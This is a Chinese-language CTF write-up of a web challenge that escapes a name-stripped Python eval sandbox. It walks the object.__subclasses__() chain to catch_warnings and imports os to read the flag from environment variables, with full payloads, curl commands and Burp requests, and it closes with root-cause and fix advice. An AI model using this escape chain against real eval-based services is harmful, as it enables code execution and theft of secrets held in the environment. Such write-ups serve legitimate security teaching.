# putcCTF - Lorem Ipsum Arcanum Invocatum Writeup

## 题目信息
- **比赛**: putcCTF
- **题目**: Lorem Ipsum Arcanum Invocatum
- **类别**: Web
- **难度**: 简单
- **附件/URL**: `http://oracle.putcyberdays.pl:80/`
- **附件链接**: 无附件，题目为在线靶机
- **Flag格式**: `putcCTF{...}`
- **状态**: 已解

## Flag

```text
putcCTF{Y0UR3_4_W1Z4RD_H4RRY}
```

## 解题过程

### 1. 初始侦察 / 页面行为分析
- 打开首页后，页面只有一个输入框和一个 `Transmuta` 按钮，前端通过 `fetch('/')` 把输入内容以 `code=` 的形式 `POST` 回首页。
- 页面文案里有几句非常关键的提示：
  - `All common names have been removed from the lexicon`
  - `relations and dependencies between beings`
  - `the flame's surroundings`
- 这些描述很像在暗示一个“去掉常见名字，但对象关系链还在”的 Python 沙箱。

前端请求逻辑如下：

```javascript
const res  = await fetch('/', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'code=' + encodeURIComponent(code)
});
```

这说明核心入口只有一个：

```text
POST /
code=<用户输入的表达式>
```

### 2. 确认后端在执行 Python 表达式
先用最简单的表达式探测：

```text
1+1
7*7
().__class__
globals()
__import__("os")
```

返回结果显示：
- `1+1` 返回 `2`
- `7*7` 返回 `49`
- `().__class__` 返回 `<class 'tuple'>`
- `globals()` 报错 `name 'globals' is not defined`
- `__import__` 报错 `name '__import__' is not defined`

这可以确认两点：
- 后端确实在做 Python 表达式求值
- 常见内建名字被删掉了，但对象本身没有被限制

### 3. 关键突破点一：沿对象关系链取回 builtins
既然题目明确说“名字被移除了，但关系仍然存在”，那就不再依赖变量名，而是从对象图里往上爬。

先确认是否还能走到 `object`：

```python
().__class__.__base__
```

返回：

```text
<class 'object'>
```

接着枚举 `object` 的子类：

```python
[x.__name__ for x in (()).__class__.__base__.__subclasses__() if 'warning' in x.__name__.lower()]
```

返回中出现了：

```text
['WarningMessage', 'catch_warnings']
```

`catch_warnings` 是 Python 沙箱逃逸里非常经典的 gadget，因为它能让我们重新摸到 `_module.__builtins__`。

于是构造：

```python
[x for x in (()).__class__.__base__.__subclasses__() if x.__name__=='catch_warnings'][0]()._module.__builtins__
```

返回结果中重新拿到了完整的 builtins，其中就包括：

```text
'__import__': <built-in function __import__>
'open': <built-in function open>
'globals': <built-in function globals>
```

### 4. 关键突破点二：读取环境变量获取 Flag
题目文案还给了另一个提示：`the flame's surroundings`。

在这类 Web 题里，`surroundings` 很容易让人联想到进程环境，也就是环境变量。既然已经拿回 `__import__`，就可以直接导入 `os` 查看环境：

```python
[x for x in (()).__class__.__base__.__subclasses__() if x.__name__=='catch_warnings'][0]()._module.__builtins__['__import__']('os').environ
```

返回中直接出现：

```text
'FLAG': 'putcCTF{Y0UR3_4_W1Z4RD_H4RRY}'
```

最终 payload：

```python
[x for x in (()).__class__.__base__.__subclasses__() if x.__name__=='catch_warnings'][0]()._module.__builtins__['__import__']('os').environ['FLAG']
```

### 5. 获取 Flag
将上面的 payload 作为 `code` 提交后，服务端直接返回：

```text
putcCTF{Y0UR3_4_W1Z4RD_H4RRY}
```

## 攻击链 / 解题流程总结

```text
页面源码分析 -> 确认唯一入口为 POST / code=... -> 探测出后端在做 Python 表达式求值 -> 发现 globals/__import__ 被移除但对象属性仍可访问 -> 通过 object.__subclasses__() 找到 catch_warnings -> 从 _module.__builtins__ 取回 __import__ -> 导入 os 读取环境变量 -> 获取 FLAG
```

## 漏洞分析 / 机制分析

### 根因
- 后端直接对用户输入进行了 Python 表达式求值。
- 防护方式只是“删除危险名字”一类的浅层黑名单，而没有真正隔离对象模型。
- 即使 `globals`、`__import__` 等名字不可直接访问，攻击者仍然可以通过 `().__class__.__base__.__subclasses__()` 这类对象关系链重新找到可利用类，再取回 builtins。

可以把题目的核心问题抽象成下面这种逻辑：

```python
safe_globals = {
    "__builtins__": {
        # 试图删掉 import、globals、open 等危险名字
    }
}

result = eval(user_input, safe_globals, {})
```

如果只删名字、不隔离对象关系，那么以下能力通常仍然存在：
- 沿 `__class__` / `__base__` / `__mro__` 遍历类型系统
- 通过 `__subclasses__()` 寻找可利用 gadget
- 经由某些类的 `_module`、`__globals__`、方法闭包等重新拿回 builtins

### 题面提示与漏洞的对应关系
- `All common names have been removed from the lexicon`
  - 对应后端移除了常见危险名字
- `relations and dependencies between beings remain`
  - 对应对象关系链依然可达
- `the flame's surroundings`
  - 对应进程环境变量 `os.environ`

这题的题面其实已经把利用思路直接写进去了。

### 影响
- 攻击者可以突破所谓的“受限表达式求值”环境。
- 一旦能拿回 `__import__` 或 `open`，就通常能继续做到：
  - 读取环境变量中的敏感信息
  - 读取本地文件
  - 进一步尝试命令执行
- 在真实场景里，这类问题本质上就是 Python Sandbox Escape / RCE 的前置阶段。

### 修复建议（适用于漏洞类题目）
1. 不要对用户输入直接使用 `eval` / `exec`。
2. 如果必须做表达式求值，使用专门的安全解析器，例如只允许固定 AST 节点的白名单解析。
3. 不要把“删掉几个危险 builtins”当作沙箱，这不能阻止对象图遍历。
4. 把敏感数据从进程环境中剥离，避免应用进程直接持有明文 `FLAG` / 密钥 / token。

## 知识点
- Python Sandbox Escape
- `object.__subclasses__()` 利用链
- `catch_warnings` gadget
- 通过 `os.environ` 读取环境变量
- 题面提示与漏洞语义对齐的阅读方式

??? note "Payload 语法拆解 FAQ"
    如果想单独看这条 payload 为什么这样写、每一段 Python 语法分别是什么意思，可以看：

    [:material-book-open-variant: Python 沙箱逃逸 Payload 语法拆解 FAQ](putcCTF_Lorem_Ipsum_Arcanum_Invocatum_payload_faq.md)

## 使用的工具
- **浏览器开发者工具 / Playwright / DevTools**: 查看页面源码、抓取 `fetch('/')` 请求、交互式测试表达式
- **curl**: 直接向 `POST /` 提交 payload
- **Python introspection**: 利用 `__class__`、`__base__`、`__subclasses__` 完成对象遍历

## 脚本归档
- Go：待补（预计文件名：`putcCTF_Lorem_Ipsum_Arcanum_Invocatum.go`）
- Python：待补（预计文件名：`putcCTF_Lorem_Ipsum_Arcanum_Invocatum.py`）
- 说明：本题 payload 很短，直接命令行复现即可

## 命令行提取关键数据（无 GUI）

```bash
# 1. 确认入口只有首页
curl -i http://oracle.putcyberdays.pl:80/

# 2. 验证服务端会执行 Python 表达式
curl -s -X POST http://oracle.putcyberdays.pl:80/ \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'code=1+1'

# 3. 验证危险名字被移除
curl -s -X POST http://oracle.putcyberdays.pl:80/ \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'code=globals()'

# 4. 通过对象关系链取回 builtins
curl -s -X POST http://oracle.putcyberdays.pl:80/ \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "code=[x for x in (()).__class__.__base__.__subclasses__() if x.__name__=='catch_warnings'][0]()._module.__builtins__"

# 5. 直接读取 FLAG
curl -s -X POST http://oracle.putcyberdays.pl:80/ \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "code=[x for x in (()).__class__.__base__.__subclasses__() if x.__name__=='catch_warnings'][0]()._module.__builtins__['__import__']('os').environ['FLAG']"
```

## 推荐工具与优化解题流程

### 工具对比总结

| 工具 | 适用阶段 | 本题耗时 | 优点 | 缺点 |
|------|----------|----------|------|------|
| **浏览器开发者工具** | 初始侦察 | < 1 分钟 | 能快速看到 `fetch` 行为与交互逻辑 | 不适合批量试 payload |
| **curl** | 手工验证与最终取 flag | < 1 分钟 | 直接、可复制、最适合本题 | 手动枚举类名时较慢 |
| **Burp Suite / Repeater** | 表达式迭代调试 | 1-3 分钟 | 改 payload 很方便 | 依赖 GUI |

### 推荐流程

**推荐流程**：先看源码确认只有 `POST /` 一个入口 -> 用简单表达式确认是 Python `eval` -> 测试 `globals` / `__import__` 判断是“删名字型沙箱” -> 沿对象关系链找 gadget -> 读取 `os.environ` -> 取回 Flag。

### 工具 A（推荐首选）
- **安装**: 系统自带 `curl` 即可
- **详细步骤**:
  1. `POST /` 提交 `1+1`
  2. 再提交 `globals()`、`__import__('os')`
  3. 切换到 `().__class__.__base__.__subclasses__()`
  4. 找到 `catch_warnings`
  5. 拼出最终 `os.environ['FLAG']` payload
- **优势**: 完全贴合本题，所有关键验证都能在命令行完成

### 工具 B（可选）
- **安装**: Burp Suite
- **详细步骤**:
  1. 抓取前端按钮触发的 `POST /`
  2. 把请求发到 Repeater
  3. 逐步修改 `code=` 的内容验证不同对象链
  4. 最后发送完整 payload 读取 Flag
- **优势**: 在调试较长 payload 时比命令行更省心

#### Burp Repeater 完整请求清单

先在浏览器里随便输入一个值并提交一次，把抓到的请求发送到 Repeater。后续保持请求头不变，只改请求体最后一行的 `code=`。

基础请求模板：

```http
POST / HTTP/1.1
Host: oracle.putcyberdays.pl
Content-Type: application/x-www-form-urlencoded

code=test
```

推荐按下面顺序逐步发送：

1. 确认是表达式求值

```http
POST / HTTP/1.1
Host: oracle.putcyberdays.pl
Content-Type: application/x-www-form-urlencoded

code=1%2B1
```

期望看到：

```json
{"error":false,"result":"2"}
```

2. 确认对象属性可访问

```http
POST / HTTP/1.1
Host: oracle.putcyberdays.pl
Content-Type: application/x-www-form-urlencoded

code=().__class__
```

期望看到：

```json
{"error":false,"result":"<class 'tuple'>"}
```

3. 确认危险名字被移除

```http
POST / HTTP/1.1
Host: oracle.putcyberdays.pl
Content-Type: application/x-www-form-urlencoded

code=globals()
```

期望看到类似：

```json
{"error":true,"result":"Execution error: name 'globals' is not defined"}
```

4. 确认可以走到 `object`

```http
POST / HTTP/1.1
Host: oracle.putcyberdays.pl
Content-Type: application/x-www-form-urlencoded

code=().__class__.__base__
```

期望看到：

```json
{"error":false,"result":"<class 'object'>"}
```

5. 从子类里找 `catch_warnings`

```http
POST / HTTP/1.1
Host: oracle.putcyberdays.pl
Content-Type: application/x-www-form-urlencoded

code=[x.__name__ for x in (()).__class__.__base__.__subclasses__() if 'warning' in x.__name__.lower()]
```

期望看到包含：

```text
['WarningMessage', 'catch_warnings']
```

6. 取回 builtins

```http
POST / HTTP/1.1
Host: oracle.putcyberdays.pl
Content-Type: application/x-www-form-urlencoded

code=[x for x in (()).__class__.__base__.__subclasses__() if x.__name__=='catch_warnings'][0]()._module.__builtins__
```

期望在返回结果中看到：

```text
'__import__': <built-in function __import__>
'open': <built-in function open>
'globals': <built-in function globals>
```

7. 先查看环境变量，确认 `FLAG` 存在

```http
POST / HTTP/1.1
Host: oracle.putcyberdays.pl
Content-Type: application/x-www-form-urlencoded

code=[x for x in (()).__class__.__base__.__subclasses__() if x.__name__=='catch_warnings'][0]()._module.__builtins__['__import__']('os').environ
```

期望看到：

```text
'FLAG': 'putcCTF{...}'
```

8. 最终直接读取 Flag

```http
POST / HTTP/1.1
Host: oracle.putcyberdays.pl
Content-Type: application/x-www-form-urlencoded

code=[x for x in (()).__class__.__base__.__subclasses__() if x.__name__=='catch_warnings'][0]()._module.__builtins__['__import__']('os').environ['FLAG']
```

返回：

```text
putcCTF{Y0UR3_4_W1Z4RD_H4RRY}
```

在 Repeater 里有两个细节要注意：
- `1+1` 这类带加号的表达式建议写成 `1%2B1`，避免表单编码把 `+` 当空格。
- 长 payload 建议直接在 Raw 视图中修改，避免 Burp 参数面板自动转义影响观察。
